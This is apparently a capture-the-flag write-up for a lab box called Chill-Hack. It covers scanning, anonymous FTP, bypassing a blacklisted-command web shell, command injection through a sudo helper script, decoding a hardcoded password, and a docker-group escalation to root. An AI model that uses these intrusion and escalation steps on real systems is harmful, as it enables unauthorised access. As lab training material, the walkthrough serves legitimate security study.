# Box Name

## Chill-Hack

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
# Rustscan
```bash
rustscan -r 1-65535 -a 10.10.163.219 --ulimit 5000             
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.163.219:22
Open 10.10.163.219:21
Open 10.10.163.219:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

# Nmap 7.91 scan initiated Fri Nov 27 17:16:18 2020 as: nmap -sC -sV -vv -oN nmap/initial 10.10.152.251
Nmap scan report for 10.10.152.251
Host is up, received syn-ack (0.20s latency).
Scanned at 2020-11-27 17:16:19 CST for 28s
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.32.122
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcxgJ3GDCJNTr2pG/lKpGexQ+zhCKUcUL0hjhsy6TLZsUE89P0ZmOoQrLQojvJD0RpfkUkDfd7ut4//Q0Gqzhbiak3AIOqEHVBIVcoINja1TIVq2v3mB6K2f+sZZXgYcpSQriwN+mKgIfrKYyoG7iLWZs92jsUEZVj7sHteOq9UNnyRN4+4FvDhI/8QoOQ19IMszrbpxQV3GQK44xyb9Fhf/Enzz6cSC4D9DHx+/Y1Ky+AFf0A9EIHk+FhU0nuxBdA3ceSTyu8ohV/ltE2SalQXROO70LMoCd5CQDx4o1JGYzny2SHWdKsOUUAkxkEIeEVXqa2pehJwqs0IEuC04sv
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFetPKgbta+pfgqdGTnzyD76mw/9vbSq3DqgpxPVGYlTKc5MI9PmPtkZ8SmvNvtoOp0uzqsfe71S47TXIIiQNxQ=
|   256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKHq62Lw0h1xzNV41zO3BsfpOiBI3uy0XHtt6TOMHBhZ
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

# FTP
```bash
 ftp 10.10.163.219                                                                                                                    
Connected to 10.10.163.219.
220 (vsFTPd 3.0.3)
Name (10.10.163.219:scott): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||45876|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.

ftp> get note.txt -
remote: note.txt
229 Entering Extended Passive Mode (|||37013|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
'Anurodh told me that there is some filtering on strings being put in the command -- Apaar'
226 Transfer complete.
90 bytes received in 00:00 (0.39 KiB/s)

```

# Ferox
```bash
ferox -u http://10.10.163.219 -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 403  -x php,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.163.219
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💲  Extensions            │ [php, txt]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
301        9l       28w      315c http://10.10.163.219/secret
301        9l       28w      311c http://10.10.163.219/js
200        0l        0w        0c http://10.10.163.219/contact.php
301        9l       28w      315c http://10.10.163.219/images
301        9l       28w      322c http://10.10.163.219/secret/images
200        9l       13w      168c http://10.10.163.219/secret/index.php



```

# Website 
### baseurl nothing of intrest
![[Pasted image 20230131215914.png]]

## /secret
- this url gives a webshell to the box but has several blacklisted cmd
-  id cmd
![[Pasted image 20230131215802.png]]

-  bash cmd
![[Pasted image 20230131220231.png]]

#### list of blacklisted cmds
```bash
nc
python
bash
php
perl
rm
cat
head
tail
python3
more
less
sh
ls
```

## was able to navigate the file system using nl for cat and dir for ls
![[Pasted image 20230131220736.png]]

![[Pasted image 20230131220853.png]]

---

## Initial Foothold
---
# [[revshell]]
- ### using the web shell uploaded a revshell to /tmp and got on the box as www-data
```bash
www-data@ubuntu:/var/www/html/secret$ id   
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/var/www/html/secret$ 
```

```bash
www-data@ubuntu:/var/www/html/secret$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
www-data@ubuntu:/var/www/html/secret$
```


---
## Privilege Escalation

## privesc to user apaar
```bash
www-data@ubuntu:/var/www/html/secret$ cat /home/apaar/.helpline.sh 
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
www-data@ubuntu:/var/www/html/secret$ 

```

```bash
www-data@ubuntu:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh 

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: bash -p
Hello user! I am bash -p,  Please enter your message: bash -p
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
```

## first create some id_rsa.p key and copy it to apaar's authorized_keys file
- ## SSH in as apaar
```bash
ssh -i apaar apaar@10.10.163.219       
The authenticity of host '10.10.163.219 (10.10.163.219)' can not be established.
ED25519 key fingerprint is SHA256:mDI9eoI+sD1gmuE1Vl2iLvyVIopHnZlbAEFxr82BFwc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.163.219' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Feb  1 03:54:57 UTC 2023

  System load:  0.08               Processes:              159
  Usage of /:   26.2% of 18.57GB   Users logged in:        0
  Memory usage: 43%                IP address for eth0:    10.10.163.219
  Swap usage:   0%                 IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

19 packages can be updated.
0 updates are security updates.


Last login: Sun Oct  4 14:05:57 2020 from 192.168.184.129
apaar@ubuntu:~$ clear

```

```bash
apaar@ubuntu:~$ sudo -g anurodh /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: anurodh
Hello user! I am anurodh,  Please enter your message: bash -p
ls -la /home/anurodh
total 28
drwxr-x--- 3 anurodh anurodh 4096 Feb  1 04:48 .
drwxr-xr-x 5 root    root    4096 Oct  3  2020 ..
-rw------- 1 anurodh anurodh    0 Oct  4  2020 .bash_history
-rw-r--r-- 1 anurodh anurodh  220 Oct  3  2020 .bash_logout
-rw-r--r-- 1 anurodh anurodh 3771 Oct  3  2020 .bashrc
drwx------ 3 anurodh anurodh 4096 Feb  1 04:48 .gnupg
-rw-r--r-- 1 anurodh anurodh  807 Oct  3  2020 .profile
-rw-r--r-- 1 anurodh anurodh 1211 Oct  3  2020 source_code.php
```

```bash
cd /home/anurodh
cat source_code.php
<html>
<head>
	Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
			Email: <input type="email" name="email" placeholder="email"><br><br>
			Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
		</form>
<?php
        if(isset($_POST['submit']))
	{
		$email = $_POST["email"];
		$password = $_POST["password"];
		if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==") <===
		{ 
			$random = rand(1000,9999);?><br><br><br>
			<form method="POST">
				Enter the OTP: <input type="number" name="otp">
				<input type="submit" name="submitOtp" value="Submit">
			</form>
		<?php	mail($email,"OTP for authentication",$random);
			if(isset($_POST["submitOtp"]))
				{
					$otp = $_POST["otp"];
					if($otp == $random)
					{
						echo "Welcome Anurodh!";
						header("Location: authenticated.php");
					}
					else
					{
						echo "Invalid OTP";
					}
				}
 		}
		else
		{
			echo "Invalid Username or Password";
		}
        }
?>
</html>

echo 'IWQwbnRLbjB3bVlwQHNzdzByZA== '\n | base64 -d
!d0ntKn0wmYp@ssw0rd


```


# SSH in as anurodh
```bash
ssh anurodh@10.10.163.219
anurodh@10.10.163.219\'s password: '!d0ntKn0wmYp@ssw0rd'
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Feb  1 04:59:07 UTC 2023

  System load:  0.0                Processes:              126
  Usage of /:   26.2% of 18.57GB   Users logged in:        1
  Memory usage: 43%                IP address for eth0:    10.10.163.219
  Swap usage:   0%                 IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

19 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

anurodh@ubuntu:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)

anurodh@ubuntu:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
anurodh@ubuntu:~$ docker run -it -v /:/mnt alpine chroot /mnt
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@0a25cd5d5be3:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

```bash
root@0a25cd5d5be3:/# cd
root@0a25cd5d5be3:~# ls -la
total 68
drwx------  6 root root  4096 Oct  4  2020 .
drwxr-xr-x 24 root root  4096 Oct  3  2020 ..
-rw-------  1 root root     0 Oct  4  2020 .bash_history
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 Oct  3  2020 .cache
drwx------  3 root root  4096 Oct  3  2020 .gnupg
-rw-------  1 root root   370 Oct  4  2020 .mysql_history
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root 12288 Oct  4  2020 .proof.txt.swp
drwx------  2 root root  4096 Oct  3  2020 .ssh
drwxr-xr-x  2 root root  4096 Oct  3  2020 .vim
-rw-------  1 root root 11683 Oct  4  2020 .viminfo
-rw-r--r--  1 root root   166 Oct  3  2020 .wget-hsts
-rw-r--r--  1 root root  1385 Oct  4  2020 proof.txt

```


---
